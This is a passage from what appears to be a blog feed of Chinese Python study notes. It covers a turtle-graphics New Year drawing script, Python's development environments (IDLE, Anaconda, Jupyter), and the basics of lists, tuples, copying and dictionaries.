t.right(<span class="number">90</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    t.pencolor(<span class="string">&quot;black&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tree2</span>(<span class="params">x, y</span>):</span><br><span class="line">    go(x, y)</span><br><span class="line">    t.pensize(<span class="number">3</span>)</span><br><span class="line">    draw_tree(<span class="number">50</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文字写入函数：用于对联、福字、祝福语的写入与位置、颜色设置</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Words_set</span>(<span class="params">w1,w2,w3,w4,w5</span>):</span><br><span class="line">    t.pencolor(<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    x = -<span class="number">106</span></span><br><span class="line">    y = -<span class="number">89</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> w1:</span><br><span class="line">        go(x, y)</span><br><span class="line">        t.write(i, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;normal&#x27;</span>))</span><br><span class="line">        y = y-<span class="number">20</span></span><br><span class="line"></span><br><span class="line">    x = x + <span class="number">317</span></span><br><span class="line">    y = -<span class="number">89</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> w2:</span><br><span class="line">        go(x, y)</span><br><span class="line">        t.write(i, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;normal&#x27;</span>))</span><br><span class="line">        y = y - <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    x = <span class="number">38</span></span><br><span class="line">    y = -<span class="number">80</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> w3:</span><br><span class="line">        go(x, y)</span><br><span class="line">        t.write(i, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">15</span>, <span class="string">&#x27;normal&#x27;</span>))</span><br><span class="line">        x = x + <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    x = -<span class="number">50</span></span><br><span class="line">    y = -<span class="number">145</span></span><br><span class="line">    go(x, y)</span><br><span class="line">    t.write(w4, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;normal&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    x = -<span class="number">260</span></span><br><span class="line">    y = <span class="number">140</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> w5:</span><br><span class="line">        go(x, y)</span><br><span class="line">        r = random.random()</span><br><span class="line">        g = random.random()</span><br><span class="line">        b = random.random()</span><br><span class="line">        t.pencolor(r, g, b)</span><br><span class="line">        t.write(i, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">50</span>, <span class="string">&#x27;normal&#x27;</span>))</span><br><span class="line">        x = x + <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数，用于调用其他函数完成工作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 用于自定义你的对联内容</span></span><br><span class="line">    words1 = <span class="built_in">input</span>(<span class="string">&quot;请输入你的上联（7言）：&quot;</span>)</span><br><span class="line">    words2 = <span class="built_in">input</span>(<span class="string">&quot;请输入你的下联（7言）：&quot;</span>)</span><br><span class="line">    words3 = <span class="built_in">input</span>(<span class="string">&quot;请输入你的横批（4字）：&quot;</span>)</span><br><span class="line">    words4 = <span class="string">&quot;福&quot;</span></span><br><span class="line">    words5 = <span class="string">&#x27;Happy New Year!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 以下为turtle的操作，进行具体的图形绘画（具体功能在上介绍）</span></span><br><span class="line">    bg()</span><br><span class="line">    Tree1(<span class="number">400</span>, -<span class="number">150</span>)</span><br><span class="line">    house(-<span class="number">122</span>, -<span class="number">223</span>)</span><br><span class="line">    sun(-<span class="number">375</span>, <span class="number">115</span>)</span><br><span class="line">    Tree2(<span class="number">380</span>, -<span class="number">160</span>)</span><br><span class="line">    Words_set(words1, words2, words3, words4, words5)</span><br><span class="line">    snow(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    t.done()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果截图</strong>：<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095604620.png" alt="image-20231109095604620"></p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习--Python语言概述和开发环境</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0--Python%E8%AF%AD%E8%A8%80%E6%A6%82%E8%BF%B0%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134434.png" alt="思维导图1"></p>
<h1 id="课程导学"><a href="#课程导学" class="headerlink" title="课程导学"></a>课程导学</h1><blockquote>
<p>对本节内容进行概述</p>
</blockquote>
<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><blockquote>
<p>语言概述</p>
</blockquote>
<ul>
<li>版本</li>
<li>特点</li>
</ul>
<blockquote>
<p>开发环境</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134435.png" alt="开发环境"></p>
<h2 id="目标和任务"><a href="#目标和任务" class="headerlink" title="目标和任务"></a>目标和任务</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134439.png" alt="目标和任务"></p>
<h1 id="Python语言概述"><a href="#Python语言概述" class="headerlink" title="Python语言概述"></a>Python语言概述</h1><blockquote>
<p>承接上述内容，根据课程结构进行Python语言的概述</p>
</blockquote>
<p>Python开创者：Guido vanRossum</p>
<blockquote>
<p>Python版本：</p>
</blockquote>
<ul>
<li>Python2.7</li>
<li>Python3.X</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134440.png" alt="python3.x"></p>
<p>注：截止2022年1月7日，Python版本已经更新到3.10</p>
<blockquote>
<p>Python语言的特点</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134441.png" alt="特点"></p>
<blockquote>
<p>解释型语言</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134442.png" alt="vs"></p>
<p>解释型语言需要解释器，解释型过程就是将源代码逐条转换成目标代码同时逐条运行的过程。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134443.png" alt="解释"></p>
<p>解释型语言依赖于解释器，需要相应平台提供，所以可以跨多个平台进行；但是由于是逐行解释，程序执行效率低。</p>
<h1 id="Python开发环境"><a href="#Python开发环境" class="headerlink" title="Python开发环境"></a>Python开发环境</h1><h2 id="交互式"><a href="#交互式" class="headerlink" title="-交互式"></a>-交互式</h2><p>官网安装即可：<a href="https://www.python.org/">https://www.python.org/</a><br>注意勾选PATH环境变量</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134444.png" alt="交互式"></p>
<h2 id="idle"><a href="#idle" class="headerlink" title="-idle"></a>-idle</h2><blockquote>
<p>属于初学者最直接的python程序执行方式</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134445.png" alt="idle"></p>
<p>第一种方式：交互式<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134446.png" alt="交互式"></p>
<p>第二种方式：文件式<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134447.png" alt="文件式"></p>
<p>注：使用命令行也可以进行程序的执行<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134448.png" alt="cmd"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134449.png" alt="忠告"></p>
<h2 id="Anaconda"><a href="#Anaconda" class="headerlink" title="-Anaconda"></a>-Anaconda</h2><blockquote>
<p>Anaconda是一个Python的发行版，可以帮助我们实现包的管理。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134454.png" alt="集成开发"></p>
</blockquote>
<blockquote>
<p>anaconda的作用<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134455.png" alt="anaconda"></p>
</blockquote>
<p>有关anaconda和conda的更多知识可以看另一篇博客，包含安装流程、常用的conda指令、相关内容的阐述。</p>
<h2 id="jupyter"><a href="#jupyter" class="headerlink" title="-jupyter"></a>-jupyter</h2><blockquote>
<p>jupyter Notebook是以网页的形式打开，可以在网页页面中直接编写代码和运行代码，代码的运行结果也会直接在代码块下显示的程序。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134456.png" alt="应用"><br>注：本课程采用这个方式进行，在Anaconda里已经内置jupyter.</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1682581134457.png" alt="界面"></p>
<p>解疑：<a href="https://zhuanlan.zhihu.com/p/34337292">https://zhuanlan.zhihu.com/p/34337292</a></p>
<p>关于使用anaconda安装jupyter无法运行代码的问题，可以参考一下 （亲测可用）：<a href="https://blog.csdn.net/m0_52118763/article/details/119614253">https://blog.csdn.net/m0_52118763&#x2F;article&#x2F;details&#x2F;119614253</a></p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习-ch3组合数据类型</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-ch3%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="导学"><a href="#导学" class="headerlink" title="导学"></a>导学</h1><h2 id="本节知识点"><a href="#本节知识点" class="headerlink" title="本节知识点"></a>本节知识点</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739548.png" alt="本节知识点"></p>
<p>注：本节内容很重要，但是也很细很杂，所以我们不能只是照抄一遍，还要加强记忆，不要混淆。<br>在下面的整理中，也会尽量条理的进行记录，便于记忆和查阅。</p>
<h2 id="目标和任务"><a href="#目标和任务" class="headerlink" title="目标和任务"></a>目标和任务</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739556.png" alt="目标、任务"></p>
<h1 id="3-1-序列"><a href="#3-1-序列" class="headerlink" title="3.1 序列"></a>3.1 序列</h1><blockquote>
<p>本节思维导图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739544.png" alt="思维导图"></p>
<h2 id="3-1-1-序列简介"><a href="#3-1-1-序列简介" class="headerlink" title="3.1.1 序列简介"></a>3.1.1 序列简介</h2><ul>
<li>序列是一种包含多种数据的数据结构，这种数据结构按照顺序存储。python中常见的序列类型包含<strong>字符串、列表、元组</strong>。</li>
<li><strong>不可变序列</strong>是指数据结构一旦建立，就不能修改其中的元素，<strong>字符串</strong>和<strong>元组</strong>是不可变序列。</li>
<li><strong>可变序列</strong>：与上相反，其元素可以进行修改，<strong>列表</strong>、<strong>字典</strong>、<strong>集合</strong>是可变序列。</li>
<li><strong>正向递增</strong>序号，从<strong>0</strong>开始；<strong>反向递增</strong>序列，从**-1**开始。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739546.png" alt="递增图"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739547.png" alt="示例"></p>
<p><strong>注</strong>：对于可变序列，改变其中元素的值，其<strong>地址</strong>不会发送改变，</p>
<h2 id="3-1-2-创建列表和元组"><a href="#3-1-2-创建列表和元组" class="headerlink" title="3.1.2 创建列表和元组"></a>3.1.2 创建列表和元组</h2><blockquote>
<p>使用[item0,item1,item2…]创建列表<br>使用(item0,item1,item2…)创建元组</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739550.png" alt="eg3.1.2-1"></p>
<hr>
<blockquote>
<p>列表和元组之中的数据项可以相同也可以不同。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739551.png" alt="eg3.1.2-2"></p>
<h1 id="3-2-列表和元组的通用操作"><a href="#3-2-列表和元组的通用操作" class="headerlink" title="3.2 列表和元组的通用操作"></a>3.2 列表和元组的通用操作</h1><blockquote>
<p>这一小节介绍列表和元组的通用操作，也就是二者都可以使用的操作，后面再介绍二者的特有操作。</p>
</blockquote>
<p>本节思维导图：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739566.png" alt="思维导图-3.2"></p>
<h2 id="通用操作1：索引查找和切片"><a href="#通用操作1：索引查找和切片" class="headerlink" title="通用操作1：索引查找和切片"></a>通用操作1：索引查找和切片</h2><blockquote>
<p>通过索引访问元素</p>
</blockquote>
<p>这一操作在前面已经介绍过，不再赘述。需要注意的是访问时的<strong>正向和反向</strong>起始值的区别。</p>
<hr>
<blockquote>
<p><strong>slice切片</strong></p>
<blockquote>
<p>此内容很重要，也很灵活，要多多实践。<br>只要序列可以<strong>通过索引</strong>进行操作，就可以进行切片。包括：字符串、元组、列表、range等有序序列。</p>
</blockquote>
</blockquote>
<p><strong>作用</strong>：通过索引获取序列中的某一段<br><strong>语法格式</strong>：<code> [start:end:step]</code></p>
<ul>
<li>start:切片开始的索引，默认为0。</li>
<li>end:切片结束的索引，默认为序列长度。（不包含end)</li>
<li>step: 步长，默认为1。其正负表示切片方向。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739557.png" alt="示例"></p>
<p>进行切片操作时，最重要的是<strong>判断对起始和结束的位置</strong>，同时结束位置是<strong>开区间</strong>，不取此值。<br>但是当结束位为空时，会<strong>根据步长</strong>决定是走到最后还是最前端。</p>
<h2 id="通用操作2"><a href="#通用操作2" class="headerlink" title="通用操作2"></a>通用操作2</h2><blockquote>
<p>操作1：查找和计数——&gt;</p>
</blockquote>
<ul>
<li><code>list.index(x)</code>:x在列表中的第一次出现的位置，不存在<strong>抛出异常</strong>。</li>
<li><code>list.count(x)</code>:x在列表中出现的次数，不存在<strong>返回0</strong>。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739555.png" alt="index-eg"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739558.png" alt="count-eg"></p>
<hr>
<blockquote>
<p>操作2：最大值、最小值、长度——&gt;</p>
</blockquote>
<p>使用内置函数<code>max(),min(),len()</code>实现上三功能。<br>注：列表和元组的元素类型必须相同。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739560.png" alt="eg-3.2.2"></p>
<hr>
<blockquote>
<p>操作3：加法、乘法、in运算——&gt;</p>
</blockquote>
<ul>
<li><code>list1+list2</code>:返回二者元素之和</li>
<li><code>list * n </code>:对应的列表或者元组重复n遍</li>
<li><code>x in list1</code> :判断x是否在其中，True or False</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739561.png" alt="加法"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739562.png" alt="乘法"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739565.png" alt="in运算"></p>
<hr>
<blockquote>
<p>操作4：序列封包和解包——&gt;</p>
</blockquote>
<ul>
<li><strong>序列封包</strong>：将多个值赋给一个变量时，python会把这些值封装为一个元组。</li>
<li><strong>序列解包</strong>：将序列直接赋给多个变量时，序列中的元素一次赋值。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739616.png" alt="示例"></p>
<h1 id="3-3-列表的操作"><a href="#3-3-列表的操作" class="headerlink" title="3.3 列表的操作"></a>3.3 列表的操作</h1><blockquote>
<p>下面来介绍一下列表的特有操作</p>
</blockquote>
<p>思维导图如下：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739619.png" alt="思维导图-3.3"></p>
<h2 id="3-3-1-学前准备：dir-函数"><a href="#3-3-1-学前准备：dir-函数" class="headerlink" title="3.3.1 学前准备：dir()函数"></a>3.3.1 学前准备：dir()函数</h2><blockquote>
<p>dir()函数可以查看对象内的所有的属性和方法</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739624.png" alt="eg-3.3.1"></p>
<p>在一系列方法里我们要重点关注不带下划线的部分。</p>
<h2 id="3-3-2-常用操作汇总"><a href="#3-3-2-常用操作汇总" class="headerlink" title="3.3.2 常用操作汇总"></a>3.3.2 常用操作汇总</h2><blockquote>
<p>以下操作会改变原列表数据，所以元组不可以使用。</p>
</blockquote>
<blockquote>
<p>操作1：list()创建列表</p>
</blockquote>
<p>使用<strong>内置函数</strong><code>list()</code>创建列表</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739625.png" alt="eg-1"></p>
<hr>
<blockquote>
<p>操作2：增加元素</p>
</blockquote>
<ul>
<li><code>append(x)</code>：在列表尾部追加元素。（注：此方法可以接受单个值，也可以接收元组或列表，但是此时，元组和列表是作为<strong>一个整体</strong>追加的，这样就形成了嵌套。）</li>
<li><code>insert(d,x)</code>：在列表的指定位置插入元素</li>
<li><code>extend(x)</code>：将一个列表追加到列表尾部，不是作为一个整体。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739644.png" alt="eg-2"></p>
<p><strong>注</strong>:使用extend()追加元素是，必须是<strong>可迭代对象</strong>（for in可遍历：列表、字符串、元组、字典） </p>
<hr>
<blockquote>
<p>操作3：删除元素</p>
</blockquote>
<ul>
<li><code>del()</code>：根据索引删除列表的一个元素或一段区间的元素</li>
<li><code>remove()</code>：根据<strong>元素本身</strong>删除列表的某一个元素</li>
<li><code>clear()</code>：清空列表</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739730.png" alt="eg-3"><br><strong>这里注意</strong>：del()的使用与其他不同，是在<strong>列表前面</strong>。</p>
<p>下面是<strong>一个例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739742.png"></p>
<p>我们发现，第二个方法无法实现。这是因为我们删除的x与 for in的x是一个列表，而这个<strong>列表是变化</strong>的。</p>
<hr>
<blockquote>
<p>操作4：置逆和排序</p>
</blockquote>
<ul>
<li><code>reverse()</code>：将列表元素置逆，返回一个迭代器。</li>
<li><code>sort()</code>：将列表元素排序（默认从小到大。使用参数reverse&#x3D;True可以反向排序）</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739744.png" alt="eg-4-1"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739745.png" alt="eg-4-2"></p>
<p><strong>注</strong>：内置函数sorted()也可进行排序，其余sort()的<strong>区别如下</strong>：</p>
<ol>
<li>list.sort()为列表定义的，而sorted函数可以接受任何可迭代对象。</li>
<li>list.sort()会直接修改原列表，而sorted会产生一个新的排序列表。</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739746.png"><br>可见，使用sorted()不会改变原列表，而是生成一个新的列表。</p>
<hr>
<blockquote>
<p>操作5：弹出元素</p>
</blockquote>
<ul>
<li><code>pop()</code>：将列表作为栈，实现出栈操作。入栈操作使用append()。</li>
<li><code>pop(0)</code>：将列表当做队列，实现出队操作。入队使用append()。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739748.png" alt="eg-5"></p>
<h2 id="3-3-3-深拷贝和浅拷贝"><a href="#3-3-3-深拷贝和浅拷贝" class="headerlink" title="3.3.3 深拷贝和浅拷贝"></a>3.3.3 深拷贝和浅拷贝</h2><ul>
<li>shalldow copy 浅拷贝</li>
<li>deepcopy 深拷贝</li>
</ul>
<blockquote>
<p>shalldow copy 浅拷贝</p>
</blockquote>
<p><code>list.copy()</code>与<code>copy.copy(list)</code>都是浅拷贝</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739749.png" alt="浅拷贝"></p>
<p>可见，浅拷贝后的两个列表是存在联系的，具体是拷贝过后的list2如果改变其可变元素（如列表）,会使得list1也一起发生变化。</p>
<blockquote>
<p>deepcopy 深拷贝</p>
</blockquote>
<p><code>copy.deepcopy(list)</code>是深拷贝的实现方法。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739751.png" alt="深拷贝"></p>
<p>深拷贝的两个列表无关联。</p>
<blockquote>
<p>list1&#x3D;list2</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739752.png" alt="等号"></p>
<p>经过等号连接的两个列表是完全关联的，一个变化另一个也会变化。</p>
<h3 id="三种拷贝方式的原因"><a href="#三种拷贝方式的原因" class="headerlink" title="三种拷贝方式的原因"></a>三种拷贝方式的原因</h3><blockquote>
<p>python对数据的存储方式的不同</p>
</blockquote>
<p>究其原因，在于拷贝后的列表，其各个元素的存储空间是否与原列表的存储空间相同。</p>
<ul>
<li>浅拷贝：可变元素的存储空间与原列表一致，其他元素有新的存储空间。</li>
<li>深拷贝：拷贝后的列表其元素都有了新的存储空间。</li>
<li>等号：拷贝后的列表其元素与原列表元素存储空间一致。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739754.png" alt="验证"></p>
<h1 id="3-4-元组操作"><a href="#3-4-元组操作" class="headerlink" title="3.4 元组操作"></a>3.4 元组操作</h1><blockquote>
<p>思维导图：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739756.png" alt="思维导图-3.4"></p>
</blockquote>
<p>相对于列表，元组在创建之后不可改变。</p>
<blockquote>
<p>操作1：元组的创建</p>
</blockquote>
<p>使用<code>tuple()</code>内置函数或者<code>(item,)</code>进行创建</p>
<p>注：使用小括号进行创建时，如果只有一个元素，需要在其后加上逗号。</p>
<hr>
<blockquote>
<p>操作2：元组和列表的转换（内置函数）</p>
</blockquote>
<ul>
<li><code>list()</code>将元组转换为列表</li>
<li><code>tuple()</code>将列表转换为元组</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739758.png" alt="eg2"></p>
<p>通过这种方法可以实现元组的变化。</p>
<h1 id="3-5-字典"><a href="#3-5-字典" class="headerlink" title="3.5 字典"></a>3.5 字典</h1><blockquote>
<p>列表和元组都是一个有序序列，可以通过索引访问元素。但是如果我们不知道索引，就需要进行遍历查找元素。这是一个耗时的过程，所以引入字典。<br>假设数据本身<strong>具有唯一性</strong>，这时可以通过字典的方式进行存储，实现<strong>快速查找</strong>。</p>
</blockquote>
<p>本节思维导图：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739797.png" alt="思维导图-3.5"></p>
<h2 id="3-5-1-字典的创建和访问"><a href="#3-5-1-字典的创建和访问" class="headerlink" title="3.5.1 字典的创建和访问"></a>3.5.1 字典的创建和访问</h2><blockquote>
<p>操作1：字典的创建</p>
</blockquote>
<ol>
<li>通过<code>&#123;key1:value,key2:value...&#125;</code>等键值对的方式创建</li>
</ol>
<ul>
<li><strong>键</strong>可以是python中任意<strong>不可变</strong>的元素，包括：<code>实数</code>、<code>复数</code>、<code>字符串</code>、<code>元组</code>等，但不可以是</li>
<li><code> 列表</code>、<code>集合</code>、<code>字典</code>等<strong>可变元素</strong>。</li>
<li>通过键获取值的位置。</li>
<li>键是唯一的，不可重复；值不可以重复</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739760.png" alt="eg-3.5.1-1"></p>
<ol start="2">
<li>通过内置函数<code>dict()</code>创建字典</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739761.png" alt="eg-3.5.1-2"></p>
<ol start="3">
<li>以关键参数的形式创建字典</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739763.png" alt="eg-3.5.1-3"></p>
<ol start="4">
<li>fromkeys()方法</li>
</ol>
<p><strong>语法格式</strong>：<code>dict.fromkeys(seq[,value])</code><br><strong>作用</strong>：用于创建一个新的字典，</p>
<ul>
<li>seq – 字典键值列表</li>
<li>value – 可选参数, 设置键序列（seq）的值</li>
</ul>
<p><strong>例子</strong>:<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739795.png"></p>
<hr>
<blockquote>
<p>操作2：访问元素</p>
</blockquote>
<p>通过<code>dict[键] </code>访问对应的值。<br>注：字典是无序的，不可以通过索引进行访问。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739798.png" alt="eg-3.5.1-4"></p>
<blockquote>
<p>使用sorted()进行排序</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739799.png"></p>
<p>对字典进行排序，会返回一个列表，将其键进行排序。原字典不会改变。</p>
<h2 id="3-5-2-字典的增删改"><a href="#3-5-2-字典的增删改" class="headerlink" title="3.5.2 字典的增删改"></a>3.5.2 字典的增删改</h2><blockquote>
<p>操作1: 增加字典元素</p>
</blockquote>
<p><code>d[key]=value</code>:将key对应的值修改为value,不存在则增加对应键值对 .</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739829.png" alt="eg-3.5.2-2"></p>
<hr>
<blockquote>
<p>操作2:删除元素(后置)</p>
</blockquote>
<ul>
<li><code>del dict[key]</code>:通过键来删除元素,键不存在会报错.</li>
